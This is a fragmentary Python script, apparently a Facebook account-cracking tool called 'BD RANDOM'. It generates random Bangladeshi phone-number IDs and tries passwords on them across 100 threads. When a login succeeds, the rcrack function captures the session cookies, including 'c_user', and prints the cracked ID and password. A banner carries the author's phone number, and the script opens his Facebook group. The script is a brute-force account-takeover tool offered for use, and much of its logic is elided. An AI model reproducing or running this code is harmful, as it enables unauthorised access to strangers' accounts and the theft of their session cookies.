...
┃.##.....##..######..####.##...... ┃ PHONE  : 01860568307 ┃
┣━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┻━━━━┳━━━━━━━━━━━━━━━━━┫
┃ TOOL : BD RANDOM  ┃ WP : +8801860568307┃  VERSION : 0.0.2┃
╚━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━╝
""")
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
...
def fuck():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=100) as ASIF:
        os.system('clear')
        print(logo)
        os.system('xdg-open https://facebook.com/groups/880726047019086/')
        tl = str(len(user))
        print('\033[1;37m[\033[1;32m✓\033[1;32m] SIM CODE : '+nude)
        print('\033[1;37m[\033[1;32m✓\033[1;32m] SOME ID,S WAS LOCKED ')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOOL CREATED BY ASIFJOIN MY GROUP ')
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[ASIF] {uid} • {ps}")
